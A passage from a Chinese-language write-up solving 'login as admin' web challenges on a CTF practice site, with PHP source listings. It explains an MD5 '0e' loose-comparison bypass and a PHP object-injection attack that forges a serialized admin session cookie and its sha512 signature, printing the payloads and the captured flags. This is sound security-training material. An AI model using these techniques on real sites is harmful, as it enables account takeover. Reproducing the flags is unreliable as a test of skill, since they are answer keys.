</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>                    &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-brand&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/&#34;</span>&gt;Please Hack Me&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>                &lt;<span style=color:#ff6ac1>ul</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;nav navbar-nav&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/scoreboard&#34;</span>&gt;Scoreboard&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;?show_source=1&#34;</span> <span style=color:#57c7ff>target</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;_blank&#34;</span>&gt;Source Code&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span>                &lt;/<span style=color:#ff6ac1>ul</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span>            &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;col-md-6 col-md-offset-3&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>===</span> <span style=color:#ff6ac1>false</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;alert alert-danger&#34;</span>&gt;Login failed&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>elseif</span>(<span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;admin&#39;</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;alert alert-success&#34;</span>&gt;Hello, admin! Here is your flag: &lt;<span style=color:#ff6ac1>code</span>&gt;<span style=color:#78787e>&lt;?</span><span style=color:#ff6ac1>=</span><span style=color:#ff5c57>$flag</span><span style=color:#78787e>?&gt;</span>&lt;/<span style=color:#ff6ac1>code</span>&gt;&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>elseif</span>(<span style=color:#ff5c57>$user</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;alert alert-info&#34;</span>&gt;You are not admin, no flag for you! :P&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>else</span><span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span><span>            &lt;<span style=color:#ff6ac1>form</span> <span style=color:#57c7ff>action</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;.&#34;</span> <span style=color:#57c7ff>method</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;POST&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span><span>                    &lt;<span style=color:#ff6ac1>label</span> <span style=color:#57c7ff>for</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;name&#34;</span>&gt;User:&lt;/<span style=color:#ff6ac1>label</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;name&#34;</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;text&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;name&#34;</span> <span style=color:#57c7ff>placeholder</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;User&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span><span>                    &lt;<span style=color:#ff6ac1>label</span> <span style=color:#57c7ff>for</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span>&gt;Pass:&lt;/<span style=color:#ff6ac1>label</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;text&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span> <span style=color:#57c7ff>placeholder</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Password&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control btn btn-primary&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;submit&#34;</span> <span style=color:#57c7ff>value</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Login&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71</span><span>            &lt;/<span style=color:#ff6ac1>form</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>endif</span>; <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75</span><span>&lt;/<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76</span><span>&lt;/<span style=color:#ff6ac1>html</span>&gt;
</span></span></code></pre></div><hr><p>這題也是使用<code>==</code>來作為判斷，其目標很明顯是要想辦法通過「<code>md5($_POST['password']) == '00000000000000000000000000000000'</code>」該判斷。<br>要真的雜湊出<code>00000000000000000000000000000000</code>似乎不太可能，但我們可以利用<code>==</code>的弱比對特性。</p><p>這題正是我在 <code>25</code>題<code>login as admin 3</code>中所說「這會讓我想到著名的 PHP 處理 <code>MD5</code> 的 <code>0e</code> 開頭字串總是判斷為<code>0</code>的特性。(使用<code>==</code>情況下)」<br>我們只需要想辦法將雜湊出來的結果為<code>0e</code>開頭，PHP 就會在弱比對當中將它視同<code>0</code>，該判斷式就可以繞過了。</p><p>至於原理，PHP 是允許使用科學記號表示數字的，而「<code>e</code>(或大寫<code>E</code>)」表示<code>以10為底數</code>，後方接著為次方數。<br>(例如<code>1.2*10^3</code>可以寫作<code>1.2e3</code>)<br>所以很明顯的，<code>0e</code>後方不管是什麼，一旦 PHP 將它當作數字看待，那它就會成為<code>0*10^?</code>，自然為<code>0</code>。<br>最後數字<code>0</code>使用弱比對<code>==</code>將會與字串<code>'00000000000000000000000000000000'</code>等價。</p><hr><p>怎麼搞出 MD5 雜湊為<code>0e</code>開頭的值？<br>這個網路上已經整理出一堆了，基本上只要 google「<strong>php md5 0e</strong>」就可以看到了。</p><p>於是 Flag 出現<code>FLAG{Scientific notation is awesome!!!}</code></p><hr><h2 class="relative group">29. <a href=https://ctf.hackme.quest/login8 target=_blank>login as admin 8</a><div id=29-login-as-admin-8httpsctfhackmequestlogin8 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#29-login-as-admin-8httpsctfhackmequestlogin8 aria-label=定位點>#</a></span></h2><blockquote><p>login as admin</p></blockquote><p>這題可以不太需要看原始碼。<br>在登入頁面時，會發現系統生成兩個<code>cookie</code>，分別叫做「<code>login8cookie</code>」及「<code>login8sha512</code>」。</p><p><code>login8cookie</code>值為：</p><pre tabindex=0><code>O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22user%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D
</code></pre><p>經過<code>URL decode</code>後，會得到以下資訊：</p><pre tabindex=0><code>O:7:&#34;Session&#34;:6:{s:14:&#34;Sessiondebug&#34;;b:0;s:19:&#34;Sessiondebug_dump&#34;;s:9:&#34;index.php&#34;;s:13:&#34;Sessiondata&#34;;a:0:{}s:4:&#34;user&#34;;s:0:&#34;&#34;;s:4:&#34;pass&#34;;s:0:&#34;&#34;;s:8:&#34;is_admin&#34;;b:0;}
</code></pre><p>而這段資訊拿去<code>sha512</code>雜湊後會得到<code>login8sha512</code>的值。</p><hr><p>要特別注意的是，這題不要 URL decode 之後再 hash，這會導致一些不可視字元的丟失。(例如<code>%00</code>)</p><hr><p>試著先用<code>guest</code>登入，觀察資料變化。</p><p><code>login8cookie</code>：</p><pre tabindex=0><code>O%3A7%3A%22Session%22%3A6%3A%7Bs%3A14%3A%22%00Session%00debug%22%3Bb%3A0%3Bs%3A19%3A%22%00Session%00debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22%00Session%00data%22%3Ba%3A2%3A%7Bs%3A8%3A%22password%22%3Bs%3A5%3A%22guest%22%3Bs%3A5%3A%22admin%22%3Bb%3A0%3B%7Ds%3A4%3A%22user%22%3Bs%3A5%3A%22guest%22%3Bs%3A4%3A%22pass%22%3Bs%3A5%3A%22guest%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A0%3B%7D
</code></pre><p>URL decode</p><pre tabindex=0><code>O:7:&#34;Session&#34;:6:{s:14:&#34;Sessiondebug&#34;;b:0;s:19:&#34;Sessiondebug_dump&#34;;s:9:&#34;index.php&#34;;s:13:&#34;Sessiondata&#34;;a:2:{s:8:&#34;password&#34;;s:5:&#34;guest&#34;;s:5:&#34;admin&#34;;b:0;}s:4:&#34;user&#34;;s:5:&#34;guest&#34;;s:4:&#34;pass&#34;;s:5:&#34;guest&#34;;s:8:&#34;is_admin&#34;;b:0;}
</code></pre><p>會發現，原本未登入時資料顯示<code>s:4:"user";s:0:"";</code>，登入後顯示<code>s:4:"user";s:5:"guest";</code>。<br>大概可以得知，會利用該值驗證使用者為何，並且<code>s:</code>後方為<code>byte</code>數，例如<code>guest</code>為<code>5 bytes</code>。</p><p>另外，有個值很明顯是在判斷是否為管理員<code>s:8:"is_admin";b:0;</code>，因為我們只是登入<code>guest</code>，所以與登入前一樣沒變。</p><hr><p>知道規則之後就可以開始更改了，將<code>s:4:"user";s:0:"";</code>改為<code>s:4:"user";s:5:"admin";</code>，並且將<code>s:8:"is_admin";b:0;</code>改為<code>s:8:"is_admin";b:1;</code>。</p><p>Payload：</p><pre tabindex=0><code>O:7:&#34;Session&#34;:6:{s:14:&#34;Sessiondebug&#34;;b:0;s:19:&#34;Sessiondebug_dump&#34;;s:9:&#34;index.php&#34;;s:13:&#34;Sessiondata&#34;;a:0:{}s:4:&#34;user&#34;;s:5:&#34;admin&#34;;s:4:&#34;pass&#34;;s:0:&#34;&#34;;s:8:&#34;is_admin&#34;;b:1;}
</code></pre><p>經過 URL encode 之後塞回去<code>login8cookie</code>：</p><pre tabindex=0><code>O%3A7%3A%22Session%22%3A9%3A%7Bs%3A14%3A%22%00Session%00debug%22%3BN%3Bs%3A19%3A%22%00Session%00debug_dump%22%3BN%3Bs%3A13%3A%22%00Session%00data%22%3BN%3Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22pass%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22is_admin%22%3Bb%3A1%3Bs%3A14%3A%22.Session.debug%22%3Bb%3A0%3Bs%3A19%3A%22.Session.debug_dump%22%3Bs%3A9%3A%22index.php%22%3Bs%3A13%3A%22.Session.data%22%3Ba%3A0%3A%7B%7D%7D
</code></pre><p>別忘了將它<code>sha512</code>雜湊後也塞回<code>login8sha512</code>：</p><pre tabindex=0><code>0f1c4e335966843c9008cfc8055d198734a6373bd54853dd65987608bfcb764b05f08ec23e5b3a3d458528991f93c200c9a2fb3b88f4c7f2d07430480df846ac
</code></pre><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/29/1_hu786866164285fd1353a51ec9e9ab94e3_9062_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/29/1_hu786866164285fd1353a51ec9e9ab94e3_9062_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/29/1_hu786866164285fd1353a51ec9e9ab94e3_9062_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/29/1_hu786866164285fd1353a51ec9e9ab94e3_9062_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/29/1_hu786866164285fd1353a51ec9e9ab94e3_9062_660x0_resize_box_3.png alt style=width:100%></figure></p><p>Flag <code>FLAG{object injection G____G}</code></p><hr><h2 class="relative group">30. <a href=https://ctf.hackme.quest/login8 target=_blank>login as admin 8.1</a><div id=30-login-as-admin-81httpsctfhackmequestlogin8 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#30-login-as-admin-81httpsctfhackmequestlogin8 aria-label=定位點>#</a></span></h2><blockquote><p>login as admin and grab the hidden flag</p></blockquote><p>基本上就是上一題中，有另外一個隱藏的 flag，找到它。</p><p>Source code:</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2</span><span><span style=color:#ff6ac1>require</span>(<span style=color:#5af78e>&#39;config.php&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3</span><span><span style=color:#ff6ac1>require</span>(<span style=color:#5af78e>&#39;session.php&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5</span><span><span style=color:#78787e>// class Session { ... }
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6</span><span><span style=color:#78787e></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7</span><span><span style=color:#78787e>// sorry, no source code this time. :P
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8</span><span><span style=color:#78787e></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9</span><span><span style=color:#ff5c57>$session</span> <span style=color:#ff6ac1>=</span> Session<span style=color:#ff6ac1>::</span><span style=color:#57c7ff>load</span>();
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10</span><span><span style=color:#ff5c57>$login_failed</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff6ac1>false</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12</span><span><span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;show_source&#39;</span>] <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;1&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13</span><span>    highlight_file(<span style=color:#ff9f43>__FILE__</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14</span><span>    <span style=color:#ff6ac1>exit</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17</span><span><span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;debug&#39;</span>] <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;1&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18</span><span>    <span style=color:#ff5c57>$session</span><span style=color:#ff6ac1>-&gt;</span><span style=color:#57c7ff>debug</span>();
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21</span><span><span style=color:#ff6ac1>if</span>(isset(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;name&#39;</span>])) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22</span><span>    <span style=color:#ff5c57>$login_failed</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff6ac1>!</span>Session<span style=color:#ff6ac1>::</span><span style=color:#57c7ff>login</span>(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;name&#39;</span>], <span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;password&#39;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23</span><span>} <span style=color:#ff6ac1>else</span> <span style=color:#ff6ac1>if</span>(isset(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;logout&#39;</span>])) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24</span><span>    <span style=color:#ff5c57>$session</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff6ac1>new</span> Session();
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27</span><span><span style=color:#ff5c57>$session</span><span style=color:#ff6ac1>-&gt;</span><span style=color:#57c7ff>save</span>();
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28</span><span><span style=color:#78787e>?&gt;&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29</span><span>&lt;<span style=color:#ff6ac1>html</span> <span style=color:#57c7ff>lang</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30</span><span>&lt;<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>charset</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32</span><span>    &lt;<span style=color:#ff6ac1>title</span>&gt;Login As Admin 8&lt;/<span style=color:#ff6ac1>title</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;viewport&#34;</span> <span style=color:#57c7ff>content</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;width=device-width, initial-scale=1&#34;</span>&gt;
